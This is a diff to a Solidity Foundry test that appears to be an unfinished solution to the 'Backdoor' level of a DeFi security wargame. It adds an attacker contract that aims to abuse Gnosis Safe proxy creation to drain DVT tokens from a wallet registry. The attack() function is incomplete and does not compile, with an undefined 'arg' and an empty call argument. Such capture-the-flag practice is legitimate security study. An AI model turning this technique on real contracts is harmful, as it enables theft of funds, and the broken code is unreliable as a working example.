@@ -79,6 +79,11 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        BackdoorAttacker backdoorAttacker =
+        new BackdoorAttacker{value: 0.5 ether}(address(walletFactory), address(walletRegistry), address(masterCopy), address(dvt));
+        backdoorAttacker.attack();
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -107,4 +112,33 @@ contract Backdoor is Test {
         // Attacker must have taken all tokens
         assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
     }
+}
+
+contract BackdoorAttacker {
+    address walletFactory;
+    address walletRegistry;
+    address masterCopy;
+    address dvt;
+    address attacker;
+
+    constructor(
+        address walletFactory_,
+        address walletRegistry_,
+        address masterCopy_,
+        address dvt_
+    ) payable {
+        walletFactory = walletFactory_;
+        walletRegistry = walletRegistry_;
+        masterCopy = masterCopy_;
+        dvt = dvt_;
+        attacker = msg.sender;
+    }
+
+    function attack() external payable {
+        //address[]
+        bytes memory initializer = abi.encodeWithSignature("setupOwners(address[],uint256)", arg);
+        GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(masterCopy, )
+    }
+
+    receive() external payable {}
 }
